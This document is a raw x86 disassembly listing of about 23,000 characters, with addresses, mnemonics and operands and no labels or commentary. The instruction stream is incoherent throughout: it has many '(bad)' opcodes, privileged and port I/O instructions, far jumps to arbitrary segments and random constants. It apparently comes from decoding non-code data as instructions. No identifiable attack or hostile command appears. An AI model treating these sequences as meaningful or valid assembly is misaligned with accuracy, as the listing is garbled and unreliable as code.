  48457b:	jg     0x48458c
  48457d:	mov    eax,0xff02b790
  484582:	xor    esi,DWORD PTR ds:0x9c4c1176
  484589:	jg     0x4845cc
  48458b:	mov    edi,0x852f7f36
  484590:	les    esi,FWORD PTR [edi+ebp*1-0x79c6bb2d]
  484597:	mov    DWORD PTR [ecx],ebx
  484599:	out    dx,eax
  48459a:	aaa    
  48459b:	jg     0x4845cf
  48459d:	mov    esp,ecx
  48459f:	sbb    BYTE PTR [esi],ch
  4845a1:	xor    al,0xff
  4845a3:	xor    edi,DWORD PTR [edi-0x7e]
  4845a6:	or     edi,DWORD PTR [ecx+0x31433090]
  4845ac:	aas    
  4845ad:	pop    edx
  4845ae:	ret    
  4845af:	and    DWORD PTR [ecx-0x75e5f039],esi
  4845b5:	jne    0x4845da
  4845b7:	pop    ds
  4845b8:	push   esi
  4845b9:	mov    edi,0x749a1a32
  4845be:	imul   edi,edi,0x3e
  4845c1:	push   DWORD PTR [edx]
  4845c3:	ins    DWORD PTR es:[edi],dx
  4845c4:	xor    ch,BYTE PTR [edx*1+0x7f42cfff]
  4845cb:	imul   edx,DWORD PTR [ebp+0x3f4335d6],0x4f
  4845d2:	mov    dl,0x25
  4845d4:	mov    bh,0xa9
  4845d6:	aas    
  4845d7:	inc    ebx
  4845d8:	aas    
  4845d9:	inc    ebp
  4845da:	mov    edi,0xb40a976
  4845df:	out    dx,eax
  4845e0:	jg     0x484620
  4845e2:	out    dx,eax
  4845e3:	(bad)  [ecx+0x7f338ed1]
  4845e9:	outs   dx,DWORD PTR ds:[esi]
  4845ea:	xor    dh,BYTE PTR [eax+0x7fb92c2e]
  4845f0:	aaa    
  4845f1:	jg     0x484662
  4845f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4845f4:	popa   
  4845f5:	add    DWORD PTR [edi],ecx
  4845f7:	jg     0x484620
  4845f9:	pop    edx
  4845fa:	loop   0x4845d4
  4845fc:	test   BYTE PTR [edi],bh
  4845fe:	dec    edi
  4845ff:	aas    
  484600:	sbb    al,0xec
  484602:	and    dl,BYTE PTR [eax-0x41]
  484605:	inc    ecx
  484606:	aas    
  484607:	inc    ebx
  484608:	ret    0xaada
  48460b:	mov    ch,0x3f
  48460d:	jg     0x4845c0
  48460f:	mov    DWORD PTR [ebx+0x448fbfb8],edx
  484615:	mov    edi,0x694a3418
  48461a:	xlat   BYTE PTR ds:[ebx]
  48461b:	mov    edi,0xb668835d
  484620:	aas    
  484621:	xor    eax,0x2add9fef
  484626:	lea    esi,[ebp+0x38ff633f]
  48462c:	arpl   WORD PTR [ecx+0x68],si
  48462f:	and    edi,ebx
  484631:	add    ebp,DWORD PTR [ecx-0x80]
  484634:	xor    eax,0xd7413f63
  484639:	shl    DWORD PTR [esi+0x333f9f0b],0x7f
  484640:	sbb    ah,ch
  484642:	bound  edx,QWORD PTR [ebx]
  484644:	xor    edi,DWORD PTR [edi]
  484646:	inc    esp
  484647:	jmp    DWORD PTR [eax+0x23]
  48464a:	mov    dh,0xd5
  48464c:	addr16 aas 
  48464e:	aas    
  48464f:	push   ss
  484650:	sub    al,0xb6
  484652:	cs ja  0x484654
  484655:	mov    edi,0x88ec589d
  48465a:	mov    edi,0xc43f3f33
  48465f:	fisub  DWORD PTR [edx]
  484661:	pusha  
  484662:	iret   
  484663:	mov    edi,0x4db72160
  484668:	pop    ds
  484669:	inc    DWORD PTR [esp+ecx*4+0x4e]
  48466d:	lods   eax,DWORD PTR ds:[esi]
  48466e:	loopne 0x48460f
  484670:	dec    ebx
  484671:	pop    ss
  484672:	mov    ch,0xd
  484674:	mov    eax,0xff319f0a
  484679:	add    eax,DWORD PTR [esi+ebp*1+0x3fff582d]
  484680:	pop    ss
  484681:	xchg   BYTE PTR [edx],ah
  484683:	adc    DWORD PTR [edi],edi
  484685:	scas   eax,DWORD PTR es:[edi]
  484686:	inc    ecx
  484687:	dec    edi
  484688:	mov    bh,0x6a
  48468a:	push   ebp
  48468b:	dec    edx
  48468c:	idiv   DWORD PTR [edi]
  48468e:	add    esp,DWORD PTR [eax]
  484690:	push   edi
  484691:	mov    al,0xa2
  484693:	(bad)  
  484694:	aas    
  484695:	inc    esi
  484696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  484697:	pusha  
  484698:	arpl   WORD PTR [edx-0x62],sp
  48469b:	pop    edi
  48469c:	push   ebp
  48469d:	mov    BYTE PTR [ecx],al
  48469f:	sar    BYTE PTR [edi+0x6978738],cl
  4846a5:	lods   al,BYTE PTR ds:[esi]
  4846a6:	xchg   BYTE PTR [edi],bl
  4846a8:	jg     0x484689
  4846aa:	inc    esi
  4846ab:	mov    al,0x1b
  4846ad:	mov    ch,0x5f
  4846af:	or     bl,BYTE PTR [edi-0x43]
  4846b2:	aad    0xc4
  4846b4:	sub    dl,BYTE PTR [edi]
  4846b6:	ja     0x4846bf
  4846b8:	loop   0x4846c8
  4846ba:	fsub   DWORD PTR ds:0xe06b6ef
  4846c0:	test   al,0x97
  4846c2:	dec    esi
  4846c3:	pop    ss
  4846c4:	das    
  4846c5:	jecxz  0x48470f
  4846c7:	push   cs
  4846c8:	xchg   bl,bl
  4846ca:	dec    edi
  4846cb:	dec    edx
  4846cc:	pop    ds
  4846cd:	xor    al,0x60
  4846cf:	sar    BYTE PTR [edx-0x67b0fc4b],0x89
  4846d6:	ffree  st(4)
  4846d8:	pop    edi
  4846d9:	out    dx,eax
  4846da:	xor    DWORD PTR [ecx],0x3f2f36da
  4846e0:	outs   dx,DWORD PTR ds:[esi]
  4846e1:	and    BYTE PTR [esi],cl
  4846e3:	(bad)  
  4846e4:	push   ss
  4846e5:	add    ebx,DWORD PTR [edi+0x49]
  4846e8:	pop    eax
  4846e9:	xor    BYTE PTR [edx-0x4d],bh
  4846ec:	jmp    0x13f1:0xf074a367
  4846f3:	ss pop ds
  4846f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4846f6:	iret   
  4846f7:	jmp    0xfa9f30e
  4846fc:	test   DWORD PTR [edx],0x4a90c310
  484702:	mov    edi,0xab7b3317
  484707:	ss push edx
  484709:	pop    ds
  48470a:	mov    edi,0x1482478f
  48470f:	in     al,dx
  484710:	pop    ebp
  484711:	cmp    BYTE PTR [edi+0x7f],ch
  484714:	scas   eax,DWORD PTR es:[edi]
  484715:	cmp    BYTE PTR [eax],bl
  484717:	push   ss
  484718:	add    al,0x7
  48471a:	mov    DWORD PTR [ebp-0x19],0x472ed726
  484721:	cmp    DWORD PTR [edi-0x41fdd0bc],ebx
  484727:	test   BYTE PTR ds:0xdf39477c,dl
  48472d:	adc    eax,ebp
  48472f:	sub    al,BYTE PTR [esi]
  484731:	jmp    0x48478a
  484733:	xor    eax,0x8a97b7df
  484738:	stos   DWORD PTR es:[edi],eax
  484739:	fadd   DWORD PTR [esi+0x6f]
  48473c:	pop    ss
  48473d:	xor    al,0xff
  48473f:	pop    eax
  484740:	or     dl,BYTE PTR [ebp+0x1023433a]
  484746:	ret    
  484747:	mov    ds:0x7dbefb0,eax
  48474c:	jmp    0xa7fe6035
  484751:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  484752:	inc    ebx
  484753:	xor    al,BYTE PTR [edx+0x69]
  484756:	adc    eax,0xef2fdfac
  48475b:	mov    BYTE PTR [ebp-0x3d],dh
  48475e:	test   DWORD PTR [ebx-0x51],ebp
  484761:	push   cs
  484762:	push   ds
  484763:	mov    dh,0xdb
  484765:	aas    
  484766:	pop    esi
  484767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  484768:	pop    es
  484769:	pop    es
  48476a:	sub    eax,0xffffffd8
  48476d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48476e:	push   esi
  48476f:	inc    ebx
  484770:	das    
  484771:	xor    al,0x47
  484773:	cmp    dl,BYTE PTR [esi]
  484775:	pop    ebx
  484776:	add    eax,0x1827579f
  48477b:	cmp    BYTE PTR [edx+0x53],al
  48477e:	das    
  48477f:	fbstp  TBYTE PTR [esi]
  484781:	xor    DWORD PTR [ecx],ebx
  484783:	mov    edx,ecx
  484785:	scas   eax,DWORD PTR es:[edi]
  484786:	pop    ds
  484787:	lods   eax,DWORD PTR es:[esi]
  484789:	adc    ch,BYTE PTR [esi-0x31]
  48478c:	iret   
  48478d:	pop    ds
  48478e:	call   0x452900a0
  484793:	jg     0x4847d8
  484795:	pop    ds
  484796:	dec    ebx
  484797:	cmp    edx,DWORD PTR [ebp+0x6ecf3f62]
  48479d:	lea    ecx,[edx]
  48479f:	cmp    edi,0x5f
  4847a2:	aas    
  4847a3:	lea    ebp,cs:[edi+0x2c]
  4847a7:	xlat   BYTE PTR ds:[ebx]
  4847a8:	repz js 0x48479b
  4847ab:	ss or  al,0x7a
  4847ae:	xchg   ebx,eax
  4847af:	inc    ebx
  4847b0:	lahf   
  4847b1:	xor    ecx,DWORD PTR [edx+0x10]
  4847b4:	inc    ecx
  4847b5:	pop    ss
  4847b6:	ja     0x484817
  4847b8:	dec    eax
  4847b9:	xor    BYTE PTR [ebp+0x40ef8f0a],cl
  4847bf:	mov    ebp,0x5b072b05
  4847c4:	pop    es
  4847c5:	test   eax,0xdbd08176
  4847ca:	fild   WORD PTR [ebx]
  4847cc:	shl    DWORD PTR [esp+edi*4+0xd],0x6f
  4847d1:	pop    edi
  4847d2:	dec    eax
  4847d4:	or     eax,0xbf07582b
  4847d9:	xchg   BYTE PTR ss:[ebp+0x2f7f1810],cl
  4847e0:	xor    eax,0x434f045b
  4847e5:	add    ebx,DWORD PTR [edi+0x37]
  4847e8:	push   edi
  4847e9:	xlat   BYTE PTR ds:[ebx]
  4847ea:	sbb    al,0x6f
  4847ec:	dec    edi
  4847ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4847ee:	xor    eax,0xf201337f
  4847f3:	jno    0x484804
  4847f5:	femms  
  4847f7:	push   ds
  4847f8:	xor    al,cl
  4847fa:	sub    al,al
  4847fc:	leave  
  4847fd:	xor    BYTE PTR [edi+ebx*1-0x41],al
  484801:	dec    esp
  484802:	test   dh,al
  484804:	inc    esp
  484805:	aaa    
  484806:	scas   eax,DWORD PTR es:[edi]
  484807:	inc    ebx
  484808:	or     ch,0x68
  48480b:	jno    0x48485c
  48480d:	pop    ebx
  48480e:	pop    ds
  48480f:	dec    ebp
  484810:	inc    edi
  484811:	mov    al,0x8a
  484813:	pop    edi
  484814:	push   DWORD PTR [eax]
  484816:	xlat   BYTE PTR ds:[ebx]
  484817:	adc    al,0xe
  484819:	cs mov edx,0x5737c71e
  48481f:	ins    DWORD PTR es:[edi],dx
  484820:	cmp    bh,BYTE PTR [eax+0x3a]
  484823:	add    edx,DWORD PTR [edi-0x1291b0e9]
  484829:	in     al,0xf6
  48482b:	out    dx,eax
  48482c:	inc    esi
  48482d:	aaa    
  48482e:	aaa    
  48482f:	aaa    
  484830:	add    esi,DWORD PTR [esi-0x49]
  484833:	loope  0x484846
  484835:	hlt    
  484836:	pop    es
  484837:	fbstp  TBYTE PTR [edi]
  484839:	jae    0x484802
  48483b:	les    eax,FWORD PTR [ebp-0x45c857d8]
  484841:	stos   DWORD PTR es:[edi],eax
  484842:	fiadd  DWORD PTR [ebp+0x677fbb45]
  484848:	adc    DWORD PTR [ecx-0x7c00f0e7],esi
  48484e:	out    dx,eax
  48484f:	push   ebx
  484850:	pop    eax
  484851:	sub    al,0x4c
  484853:	aaa    
  484854:	sti    
  484855:	sub    bl,BYTE PTR [esi]
  484857:	sbb    al,0xa4
  484859:	(bad)  
  48485a:	pop    edi
  48485b:	xor    eax,DWORD PTR [esi+0x1f]
  48485e:	test   eax,0xdfb15622
  484863:	mov    DWORD PTR [bx-0x1f],ecx
  484867:	add    BYTE PTR [edi-0x51],dh
  48486a:	into   
  48486b:	jnp    0x484893
  48486d:	sub    esi,DWORD PTR ds:[ebx-0x7d11ceea]
  484874:	clc    
  484875:	imul   edx,DWORD PTR es:[ebx-0x2fe8ecea],0xffffffdb
  48487d:	call   DWORD PTR [edi]
  48487f:	imul   ecx,ebx,0xfffffff7
  484882:	dec    esp
  484883:	sbb    al,0xef
  484885:	xchg   DWORD PTR [edi],ebp
  484887:	ss push cs
  484889:	pop    esp
  48488a:	adc    dl,BYTE PTR [edi]
  48488c:	xor    ebx,DWORD PTR [edi+0x1b]
  48488f:	or     eax,0xb3d3c1db
  484894:	(bad)  
  484895:	pop    ss
  484896:	paddq  mm3,QWORD PTR [ebx-0x39b0924c]
  48489d:	cmp    BYTE PTR [ebx],bl
  48489f:	(bad)  
  4848a0:	pop    es
  4848a1:	sbb    al,0x2c
  4848a3:	jae    0x4848dc
  4848a5:	dec    edi
  4848a6:	cmp    esp,edx
  4848a8:	add    al,0xd0
  4848aa:	adc    al,0x27
  4848ac:	inc    ebx
  4848ad:	fild   DWORD PTR [ebx+0x6d]
  4848b0:	or     esp,DWORD PTR [ecx+0x271f4784]
  4848b6:	mov    esi,DWORD PTR [edi]
  4848b8:	dec    esi
  4848b9:	jmp    0x78f5c3d
  4848be:	call   0x6eee2983
  4848c3:	inc    esi
  4848c4:	pop    edi
  4848c5:	push   edx
  4848c6:	adc    DWORD PTR [edi+0x5c],edx
  4848c9:	push   0xffffffab
  4848cb:	inc    ebp
  4848cc:	pop    es
  4848cd:	cwde   
  4848ce:	cmp    BYTE PTR [eax+0x14],0xa6
  4848d2:	inc    esi
  4848d3:	sub    eax,DWORD PTR [ebp-0x43]
  4848d6:	es (bad) 
  4848d8:	mov    eax,0x43e3e6ab
  4848dd:	inc    esp
  4848de:	pop    esp
  4848df:	rol    DWORD PTR [edx+0x7f],1
  4848e2:	xlat   BYTE PTR ds:[ebx]
  4848e3:	inc    esi
  4848e4:	dec    ebx
  4848e5:	loop   0x4848a9
  4848e7:	enter  0x7b1f,0xcf
  4848eb:	cmp    al,0xe2
  4848ed:	in     eax,0xc0
  4848ef:	inc    ebx
  4848f0:	jae    0x484971
  4848f2:	dec    ebx
  4848f3:	push   0x27457017
  4848f8:	mov    edi,0x2e844074
  4848fd:	addr16 fwait
  4848ff:	pop    edi
  484900:	les    ebp,FWORD PTR [edx+0x4a]
  484903:	pop    ss
  484904:	fbld   TBYTE PTR [edi-0x48]
  484907:	loope  0x484904
  484909:	jp     0x484916
  48490b:	jecxz  0x484914
  48490d:	inc    esi
  48490e:	pop    ebx
  48490f:	xor    esi,eax
  484911:	fimul  DWORD PTR [edx]
  484913:	ins    BYTE PTR es:[edi],dx
  484914:	pop    edi
  484915:	adc    esi,DWORD PTR [edi+0x44]
  484918:	sbb    cl,BYTE PTR [ebp+0x455a231d]
  48491e:	(bad)  
  48491f:	cmp    ch,dh
  484921:	sbb    eax,0x1f829b2f
  484926:	xchg   DWORD PTR ds:0x413347b7,eax
  48492c:	aaa    
  48492d:	xor    edi,ebp
  48492f:	repz sub ecx,DWORD PTR ds:0x768b088e
  484936:	call   0x972b:0x7853e13a
  48493d:	call   0x62df:0x80ab18d3
  484944:	pop    esp
  484946:	fimul  DWORD PTR [esi+0xf342f62]
  48494c:	pop    edi
  48494d:	sub    dh,BYTE PTR [eax+0x441e2154]
  484953:	push   edi
  484954:	sbb    al,0x19
  484956:	movq   mm0,QWORD PTR [edx+0x7b]
  48495a:	fild   QWORD PTR [ebx+0x60d8b831]
  484960:	jg     0x4848ed
  484962:	ds inc ebx
  484964:	jecxz  0x48492d
  484966:	xchg   edi,eax
  484967:	pop    ebx
  484968:	pop    ebx
  484969:	cmp    bh,cl
  48496b:	jecxz  0x48491b
  48496d:	mov    WORD PTR [ebx+0x61ba076f],es
  484973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  484974:	adc    BYTE PTR [edi+edi*8+0x2b],0xee
  484979:	nop
  48497a:	dec    eax
  48497b:	icebp  
  48497c:	dec    edi
  48497d:	scas   eax,DWORD PTR es:[edi]
  48497e:	(bad)  
  484980:	and    bl,BYTE PTR [ebp-0x604cd9c8]
  484986:	sbb    DWORD PTR [edi],edx
  484988:	lahf   
  484989:	(bad)  
  48498a:	sahf   
  48498b:	std    
  48498c:	fstp   TBYTE PTR [esp+edi*2-0x21]
  484990:	cmp    eax,0x4673e2ab
  484995:	inc    DWORD PTR [ebx+0x56]
  484998:	inc    ebx
  484999:	nop
  48499a:	loop   0x48492d
  48499c:	cwde   
  48499d:	outs   dx,DWORD PTR ds:[esi]
  48499e:	out    dx,eax
  48499f:	int    0x20
  4849a1:	ins    DWORD PTR es:[edi],dx
  4849a2:	outs   dx,DWORD PTR ds:[esi]
  4849a3:	mov    bx,0x7f4b
  4849a7:	cmp    ecx,eax
  4849a9:	xchg   ecx,eax
  4849aa:	hlt    
  4849ab:	mov    ah,0x3
  4849ad:	mov    ebx,0x4647d347
  4849b2:	es jmp 0x1310:0x86f35f39
  4849ba:	je     0x484986
  4849bc:	push   edi
  4849bd:	retf   
  4849be:	jo     0x484a30
  4849c0:	xchg   edi,eax
  4849c1:	inc    esi
  4849c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4849c3:	retf   0x9a1b
  4849c6:	sbb    bl,ah
  4849c8:	mov    ?,WORD PTR [ebx]
  4849ca:	es ret 0x1710
  4849ce:	sbb    al,0xe3
  4849d0:	xchg   ebx,ebx
  4849d2:	stos   DWORD PTR es:[edi],eax
  4849d3:	inc    esi
  4849d4:	call   0xfbf8a299
  4849d9:	push   edi
  4849da:	jnp    0x4849bf
  4849dc:	aad    0x2d
  4849de:	cwde   
  4849df:	scas   eax,DWORD PTR es:[edi]
  4849e0:	inc    esi
  4849e1:	and    edx,DWORD PTR [esi]
  4849e3:	mov    eax,DWORD PTR [ebp-0x7d]
  4849e6:	pop    ebx
  4849e7:	and    eax,0x17873fb1
  4849ec:	or     edi,DWORD PTR [ebx+0xbc56ef8]
  4849f2:	dec    edx
  4849f3:	add    esi,DWORD PTR [ebx]
  4849f5:	and    eax,esi
  4849f7:	jbe    0x4849d5
  4849f9:	mov    edx,0x332f3549
  4849fe:	sysexit 
  484a00:	daa    
  484a01:	inc    eax
  484a02:	pop    esp
  484a03:	push   0xffffff85
  484a05:	(bad)  
  484a07:	xchg   ecx,eax
  484a08:	dec    esi
  484a09:	js     0x484a7a
  484a0b:	repnz fucomip st,st(7)
  484a0e:	add    al,BYTE PTR [edi]
  484a10:	ret    
  484a11:	or     ah,BYTE PTR [ebx-0x3f]
  484a14:	(bad)  
  484a15:	xchg   ebx,eax
  484a16:	pop    ds
  484a17:	movzx  eax,WORD PTR [esi+0x63]
  484a1b:	dec    DWORD PTR [esi-0x41]
  484a1e:	inc    edi
  484a1f:	pop    edi
  484a20:	ja     0x484a3b
  484a22:	push   edi
  484a23:	xor    ah,bl
  484a25:	mov    ds:0x1f0e2eef,eax
  484a2a:	pop    ds
  484a2b:	push   0x43
  484a2d:	xchg   edx,eax
  484a2e:	das    
  484a2f:	es pop es
  484a31:	scas   eax,DWORD PTR es:[edi]
  484a32:	push   ss
  484a33:	dec    esi
  484a34:	retf   
  484a35:	xor    DWORD PTR [edx+0x41],esi
  484a38:	push   esi
  484a39:	fsubr  QWORD PTR [esi-0x48bb18da]
  484a3f:	inc    ecx
  484a40:	push   ebx
  484a41:	imul   ebp,DWORD PTR [edx],0x1f87cbc2
  484a47:	jg     0x484a8e
  484a49:	rol    DWORD PTR ds:0x922faddf,0xd7
  484a50:	cmp    BYTE PTR [edi+0x42],cl
  484a53:	pop    ecx
  484a55:	retf   
  484a56:	mov    al,0xe0
  484a58:	aaa    
  484a59:	addr16 xchg edi,eax
  484a5b:	aaa    
  484a5c:	pop    es
  484a5d:	jecxz  0x484a48
  484a5f:	call   0x13a02541
  484a64:	pop    edi
  484a65:	fcmovnb st,st(5)
  484a67:	mov    ebx,0x428307e3
  484a6c:	pop    ebx
  484a6d:	(bad)  
  484a6e:	test   esi,0x22707503
  484a74:	iret   
  484a75:	xchg   edi,eax
  484a76:	inc    esi
  484a77:	stos   DWORD PTR es:[edi],eax
  484a78:	mov    eax,0x1726734d
  484a7d:	ficom  DWORD PTR [ecx]
  484a7f:	push   ss
  484a80:	mov    eax,0x6fbeef26
  484a85:	jo     0x484ae3
  484a87:	aaa    
  484a88:	dec    ebp
  484a89:	inc    edx
  484a8a:	jg     0x484ac0
  484a8c:	aaa    
  484a8d:	aaa    
  484a8e:	cld    
  484a8f:	pop    eax
  484a90:	mov    WORD PTR [ecx+0xbcf374f],?
  484a96:	cmp    BYTE PTR [eax-0x55],al
  484a99:	mov    BYTE PTR [edi+0x47],cl
  484a9c:	xor    eax,edi
  484a9e:	cmp    dl,al
  484aa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  484aa1:	aaa    
  484aa2:	cs lahf 
  484aa4:	xlat   BYTE PTR ds:[ebx]
  484aa5:	xchg   esp,eax
  484aa6:	sub    ah,al
  484aa8:	sbb    edi,ecx
  484aaa:	ror    DWORD PTR [esi-0x75],cl
  484aad:	mov    ss,edx
  484aaf:	das    
  484ab0:	psllq  mm4,mm6
  484ab3:	sub    BYTE PTR [ebx-0x404071f2],0xab
  484aba:	xor    BYTE PTR ds:0x37f51761,dl
  484ac0:	aas    
  484ac1:	(bad)  
  484ac2:	outs   dx,BYTE PTR ds:[esi]
  484ac3:	add    DWORD PTR [esi+0xab7a388],ecx
  484ac9:	ins    BYTE PTR es:[edi],dx
  484aca:	rcl    BYTE PTR [edi],1
  484acc:	icebp  
  484acd:	mov    bl,0xe7
  484acf:	inc    ebx
  484ad0:	loopne 0x484a97
  484ad2:	loopne 0x484af1
  484ad4:	das    
  484ad5:	or     ecx,DWORD PTR [esi+0x34a443eb]
  484adb:	jmp    0x7135:0x7d2d7b0
  484ae2:	outs   dx,DWORD PTR ds:[esi]
  484ae3:	lock iret 
  484ae5:	neg    BYTE PTR [edi+0x1e]
  484ae8:	pop    edi
  484ae9:	ja     0x484a6c
  484aeb:	or     eax,0x67fb2fc2
  484af0:	js     0x484b39
  484af2:	js     0x484ab6
  484af4:	aaa    
  484af5:	mov    bh,0x9f
  484af7:	push   edi
  484af8:	and    al,0x98
  484afa:	mov    esp,0xce469f4f
  484aff:	cmp    BYTE PTR [ebx+0x27c371f6],dl
  484b05:	pop    edi
  484b06:	inc    ebp
  484b07:	daa    
  484b08:	inc    esp
  484b09:	xor    edi,0xffffff83
  484b0c:	mov    cl,0x98
  484b0e:	nop
  484b0f:	outs   dx,DWORD PTR ds:[esi]
  484b10:	sbb    esi,DWORD PTR [esi-0x382310f3]
  484b16:	jmp    0x6c60:0xf00fab8f
  484b1d:	mov    al,ds:0x78852f43
  484b22:	mov    ebp,DWORD PTR [ebp-0x2a]
  484b25:	inc    edi
  484b26:	ret    0x3fdf
  484b29:	push   0xffffffb0
  484b2b:	(bad)  
  484b2d:	inc    ecx
  484b2e:	pop    ebx
  484b2f:	(bad)  
  484b30:	xchg   edi,eax
  484b31:	xchg   ecx,eax
  484b32:	clc    
  484b33:	xor    BYTE PTR [esi-0x5d],bl
  484b36:	xchg   ebx,eax
  484b37:	sub    eax,DWORD PTR [edx+eax*2-0x498fc16]
  484b3e:	mov    ebp,0xdba5fb6e
  484b43:	inc    esp
  484b44:	pop    es
  484b45:	push   edi
  484b46:	inc    esi
  484b47:	jmp    0x484b83
  484b49:	js     0x484ad2
  484b4b:	das    
  484b4c:	iret   
  484b4d:	(bad)  
  484b4e:	jnp    0x484b13
  484b50:	scas   al,BYTE PTR es:[edi]
  484b51:	mov    WORD PTR [ebx+0x7],?
  484b54:	stos   DWORD PTR es:[edi],eax
  484b55:	pop    es
  484b56:	ss xchg edi,eax
  484b58:	scas   al,BYTE PTR es:[edi]
  484b59:	test   edx,edi
  484b5b:	and    ah,BYTE PTR [edi-0x41]
  484b5e:	or     esi,DWORD PTR [edi-0x25221d1f]
  484b64:	das    
  484b65:	dec    edi
  484b66:	dec    edi
  484b67:	pop    eax
  484b69:	(bad)  
  484b6a:	sbb    cl,BYTE PTR [edi+edi*4+0x1701b0ab]
  484b71:	mov    ebp,0x44d739ff
  484b76:	or     eax,esp
  484b78:	add    eax,0x373bda6d
  484b7d:	aas    
  484b7e:	clc    
  484b7f:	push   es
  484b80:	mov    ebx,0x3128f89
  484b85:	xor    eax,ecx
  484b87:	sar    DWORD PTR [ebx+0xfe203dc],cl
  484b8d:	adc    edi,DWORD PTR [edi]
  484b8f:	cs jmp 0x42300fd2
  484b95:	pandn  mm1,QWORD PTR ds:0xfc29c18
  484b9c:	fnsetpm(287 only) 
  484b9e:	jmp    0x484b3e
  484ba0:	mov    al,ds:0x46feda8b
  484ba5:	push   esi
  484ba6:	mov    ebp,0x42a7c64f
  484bab:	pop    es
  484bac:	aas    
  484bad:	rol    BYTE PTR cs:[ecx+0x37fb6703],0x46
  484bb5:	mov    al,ds:0xdf9b04ab
  484bba:	xchg   edi,eax
  484bbb:	pop    edi
  484bbc:	nop
  484bbd:	popf   
  484bbe:	stos   DWORD PTR es:[edi],eax
  484bbf:	push   cs
  484bc0:	(bad)  
  484bc1:	jg     0x484c07
  484bc3:	pop    ss
  484bc4:	lods   al,BYTE PTR ds:[esi]
  484bc5:	push   0x7b
  484bc7:	jno    0x484bec
  484bc9:	pop    ebx
  484bca:	xor    eax,0xac603797
  484bcf:	pop    edx
  484bd0:	or     eax,0x1d871bef
  484bd5:	pop    es
  484bd6:	ja     0x484c1f
  484bd8:	(bad)  
  484bd9:	jp     0x484b6e
  484bdb:	mov    bl,0x61
  484bdd:	repnz scas al,BYTE PTR es:[edi]
  484bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  484be0:	pop    ebx
  484be1:	push   es
  484be2:	xor    BYTE PTR ds:0xc33d180d,ch
  484be8:	fiadd  DWORD PTR [esi+0x45a37c41]
  484bee:	mov    bh,0x17
  484bf0:	data16 (bad) [edx-0x5d]
  484bf4:	inc    esi
  484bf5:	cmp    DWORD PTR [ebx],0xab9f1630
  484bfb:	or     dh,BYTE PTR [ecx+0x5fd22869]
  484c01:	mov    edi,0xab75cf38
  484c06:	test   eax,0x6539fd4
  484c0b:	push   ds
  484c0c:	push   0x8737f1a5
  484c11:	jmp    0x484c44
  484c13:	out    dx,eax
  484c14:	sbb    ch,BYTE PTR [ebx-0x65]
  484c17:	pop    ebx
  484c18:	pop    ds
  484c19:	pop    ds
  484c1a:	inc    edi
  484c1b:	jne    0x484c8b
  484c1d:	enter  0x5f7b,0x66
  484c21:	xor    edi,DWORD PTR [edi]
  484c23:	xchg   esi,eax
  484c24:	add    ch,BYTE PTR [eax-0x5e]
  484c27:	inc    ebp
  484c28:	aaa    
  484c29:	dec    ebx
  484c2a:	inc    esp
  484c2b:	aaa    
  484c2c:	mov    al,ds:0xa7d6383b
  484c31:	mov    esp,DWORD PTR [edx-0x53]
  484c34:	js     0x484c5c
  484c36:	mov    esi,0xd5d7eb57
  484c3b:	mov    ds:0x33b6eb7,al
  484c40:	addr16 push edi
  484c42:	push   cs
  484c43:	loopne 0x484caf
  484c45:	aad    0x1b
  484c47:	pop    edi
  484c48:	imul   ebx,eax,0x65
  484c4b:	cmp    al,0xde
  484c4d:	daa    
  484c4e:	mov    dl,0xb7
  484c50:	xor    eax,0xfbc1ea55
  484c55:	sysenter 
  484c57:	(bad)  
  484c58:	jbe    0x484c7f
  484c5a:	(bad)  
  484c5b:	lahf   
  484c5c:	adc    edi,DWORD PTR [eax]
  484c5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  484c5f:	jno    0x484c24
  484c61:	pop    esp
  484c62:	dec    edi
  484c63:	xchg   edi,eax
  484c64:	das    
  484c65:	xor    ah,BYTE PTR [edi+0x35]
  484c68:	cmp    al,0x1b
  484c6a:	sbb    edi,DWORD PTR [esi]
  484c6c:	mov    edi,0xb0345287
  484c71:	imul   edx,DWORD PTR [ebp+0x1a4bf3b1],0x7f71589f
  484c7b:	jnp    0x484c48
  484c7d:	xchg   ebp,eax
  484c7e:	pop    eax
  484c7f:	and    eax,0xc797af76
  484c84:	or     ebp,DWORD PTR [ecx-0x3cbb3b74]
  484c8a:	retf   
  484c8b:	or     eax,0x3b195dc0
  484c90:	add    cl,BYTE PTR [edi+0x10]
  484c93:	sub    DWORD PTR [edi],0x23
  484c96:	add    ebp,DWORD PTR [edx-0x1eeb4e90]
  484c9c:	or     esi,DWORD PTR [esi+0x36]
  484c9f:	inc    ebx
  484ca0:	in     al,0x46
  484ca2:	icebp  
  484ca3:	loop   0x484d0f
  484ca5:	(bad)  [ebx]
  484ca7:	jae    0x484cc8
  484ca9:	dec    edx
  484caa:	stos   DWORD PTR es:[edi],eax
  484cab:	jb     0x484cb4
  484cad:	inc    ebx
  484cae:	inc    ecx
  484caf:	xor    edi,esi
  484cb1:	daa    
  484cb2:	aas    
  484cb3:	dec    esi
  484cb4:	test   eax,0x3446972e
  484cb9:	jno    0x484c47
  484cbb:	(bad)  
  484cbc:	js     0x484c49
  484cbe:	addr16 inc ecx
  484cc0:	jmp    FWORD PTR [ebp-0x14e1c1cc]
  484cc6:	(bad)  
  484cc7:	aas    
  484cc8:	mov    DWORD PTR [eax],edx
  484cca:	xchg   edi,eax
  484ccb:	aam    0x5a
  484ccd:	and    edx,DWORD PTR [edi]
  484ccf:	cmovbe ecx,DWORD PTR [edi]
  484cd2:	pop    es
  484cd3:	mov    edi,0x35cf1ab3
  484cd8:	arpl   WORD PTR [eax-0x58bbd1da],sp
  484cde:	inc    esp
  484cdf:	dec    esi
  484ce0:	and    al,0xc6
  484ce2:	inc    esi
  484ce3:	mov    bl,0xf7
  484ce5:	pop    edi
  484ce6:	ror    DWORD PTR [esi],cl
  484ce8:	jl     0x484cc7
  484cea:	pop    esi
  484ceb:	push   edi
  484cec:	push   edi
